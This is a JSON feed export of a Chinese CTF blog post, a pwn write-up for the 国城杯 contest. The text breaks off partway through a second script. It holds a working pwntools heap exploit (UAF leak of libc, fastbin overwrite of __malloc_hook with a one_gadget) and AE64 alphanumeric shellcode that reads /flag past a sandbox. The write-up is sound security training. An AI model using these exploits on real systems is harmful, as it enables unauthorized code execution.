{
    "version": "https://jsonfeed.org/version/1",
    "title": "null",
    "description": "欢迎来到Huan的笔记空间~~~~~~🌸",
    "home_page_url": "https://yhuanhuan01.github.io",
    "items": [
        {
            "id": "https://yhuanhuan01.github.io/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF-pwn-wp/",
            "url": "https://yhuanhuan01.github.io/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF-pwn-wp/",
            "title": "国城杯_pwn-wp",
            "date_published": "2024-12-08T03:47:21.000Z",
            "content_html": "<h1 id=\"国城杯_pwn-wp\"><a class=\"markdownIt-Anchor\" href=\"#国城杯_pwn-wp\">#</a> 国城杯_pwn-wp</h1>\n<p><img data-src=\"/img/%E5%9B%BD%E5%9F%8E%E6%9D%AF_pwn/image-20241208105818624.png\" alt=\"image-20241208105818624\"></p>\n<p>这次的 pwn 整体难度不算高，难道 pwn 手的春天到了（</p>\n<h4 id=\"vtable_hijack\"><a class=\"markdownIt-Anchor\" href=\"#vtable_hijack\">#</a> vtable_hijack</h4>\n<p>写这 vtable，其实一点没用，2.23 的 heap，直接改 malloc_hook 为 ogg 即可</p>\n<p><img data-src=\"/img/%E5%9B%BD%E5%9F%8E%E6%9D%AF_pwn/image-20241208110151998.png\" alt=\"image-20241208110151998\"></p>\n<p>很明显，在 dele 函数上没有指针置 NULL，UAF 即可</p>\n<p><img data-src=\"/img/%E5%9B%BD%E5%9F%8E%E6%9D%AF_pwn/image-20241208110304415.png\" alt=\"image-20241208110304415\"></p>\n<p>没有现在堆块的大小。所以看着两个是真的挺签到的，并且 edit show 也有。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>huan_attack_pwn</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># from pwncli import *</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># from LibcSearcher import *</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>context<span class=\"token punctuation\">.</span>terminal <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'tmux'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'splitw'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-h'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-P'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># context(arch='i386' , os='linux', log_level='debug')</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>binary <span class=\"token operator\">=</span> <span class=\"token string\">'./pwn'</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>libc <span class=\"token operator\">=</span> <span class=\"token string\">'./libc.so.6'</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>host<span class=\"token punctuation\">,</span> port <span class=\"token operator\">=</span> <span class=\"token string\">\"125.70.243.22:31310\"</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[31;40mremote\\033[0m: (y)\\n'</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token string\">'\\033[32;40mprocess\\033[0m: (n)'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">if</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'y'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\"># r = gdb.debug(binary)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary(libc)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>default <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>                <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> time<span class=\"token operator\">=</span>default             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>rpu     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">,</span>drop<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length                   <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>lg      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name<span class=\"token punctuation\">:</span> log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"\\033[95m</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>var_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> ：\\033[91m0x</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">globals</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>var_name<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span><span class=\"token format-spec\">x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\\033[0m\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>prl     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>var_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>debug   <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> command<span class=\"token operator\">=</span><span class=\"token string\">''</span>               <span class=\"token punctuation\">:</span> gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">,</span>command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span>szie<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'choice:\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'index:\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'size:\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>szie<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'choice:\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'index:\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span>length<span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'choice:\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'3'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'index:\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'length:\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>\tsa<span class=\"token punctuation\">(</span><span class=\"token string\">'content:\\n'</span><span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre></pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'choice:\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'4'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'index:\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x200</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>show<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>libcbase <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x39bb78</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>free_hook <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>malloc_hook <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>ogg <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0x3f3e6</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x3f43a</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xd5c07</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>og <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> ogg<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>malloc_hook<span class=\"token operator\">-</span><span class=\"token number\">0x23</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>og<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x300</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'malloc_hook'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'libcbase'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h4 id=\"alpha_shell\"><a class=\"markdownIt-Anchor\" href=\"#alpha_shell\">#</a> Alpha_Shell</h4>\n<p><img data-src=\"/img/%E5%9B%BD%E5%9F%8E%E6%9D%AF_pwn/image-20241208112342394.png\" alt=\"image-20241208112342394\"></p>\n<p>逆向一下，可以发现是看见字符的 shellcode，其实也没必要逆向，看汇编也是能看的大差不差的。</p>\n<p>在这里使用 AE 写这个可见字符的 shellcode。开启沙盒</p>\n<p><img data-src=\"/img/%E5%9B%BD%E5%9F%8E%E6%9D%AF_pwn/image-20241208112731895.png\" alt=\"image-20241208112731895\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> ae64 <span class=\"token keyword\">import</span> AE64</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>shellcode <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>openat<span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"/flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sendfile<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'限制输入大小的shellcode的长度:'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x150</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># get alphanumeric shellcode</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>enc_shellcode <span class=\"token operator\">=</span> AE64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">,</span><span class=\"token string\">'rdx'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>enc_shellcode<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'latin-1'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/%E5%9B%BD%E5%9F%8E%E6%9D%AF_pwn/image-20241208112621031.png\" alt=\"image-20241208112621031\"></p>\n<p>把这段输入进程序内即可得到 flag</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>huan_attack_pwn</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># from pwncli import *</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># from LibcSearcher import *</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>context<span class=\"token punctuation\">.</span>terminal <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'tmux'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'splitw'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-h'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-P'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># context(arch='i386' , os='linux', log_level='debug')</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>binary <span class=\"token operator\">=</span> <span class=\"token string\">'./Alpha_Shell'</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># libc = './'</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>host<span class=\"token punctuation\">,</span> port <span class=\"token operator\">=</span> <span class=\"token string\">\"125.70.243.22:31801\"</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[31;40mremote\\033[0m: (y)\\n'</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token string\">'\\033[32;40mprocess\\033[0m: (n)'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">if</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'y'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td 